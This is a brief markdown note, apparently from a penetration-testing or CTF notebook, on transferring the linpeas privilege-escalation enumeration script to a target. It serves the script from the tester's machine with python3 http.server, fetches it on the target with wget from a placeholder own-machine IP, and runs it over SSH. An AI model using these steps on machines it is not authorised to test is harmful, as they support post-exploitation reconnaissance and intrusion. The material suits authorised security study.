---
share: true
---


Open a port in the folder containing linpeas :
```
python3 -m http.server 8000
```

Then use wget to download the script on the targeted machine

```
wget http://[own-machine-ip]:8000/linpeas.sh
chmod +x linpeas.sh
```

When connected in ssh to start : 
```
./linpeas.sh
```

